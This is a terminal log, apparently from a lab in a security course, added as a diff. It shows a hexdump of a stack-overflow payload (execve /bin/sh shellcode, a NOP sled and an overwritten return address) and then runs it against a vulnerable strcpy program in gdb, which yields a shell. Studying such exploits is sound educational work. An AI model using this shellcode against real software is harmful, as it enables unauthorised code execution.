@@ -1,0 +1,28 @@
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ hexdump -C strcpy_payload
+00000000  31 c0 50 68 6e 2f 73 68  68 2f 2f 62 69 89 e3 99  |1.Phn/shh//bi...|
+00000010  52 53 89 e1 b0 0b cd 80  90 90 90 90 90 90 90 90  |RS..............|
+00000020  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|
+*
+00000060  90 90 90 90 90 90 90 90  38 ef ff bf              |........8...|
+0000006c
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ gdb strcpy -q
+Reading symbols from strcpy...done.
+(gdb) run $(cat strcpy_payload)
+Starting program: /home/user/Documents/ENPM-691/C Programs/strcpy $(cat strcpy_payload)
+1�Phn/shh//bi���RS���
+                     ��������������������������������������������������������������������������������8���
+process 13564 is executing new program: /bin/dash
+$ whoami
+user
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+$ ^C
+Program received signal SIGINT, Interrupt.
+0xb7fdabd1 in ?? ()
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 13564] will be killed.
+
+Quit anyway? (y or n) y
+user@user-VirtualBox:~/Documents/ENPM-691/C Programs$ 
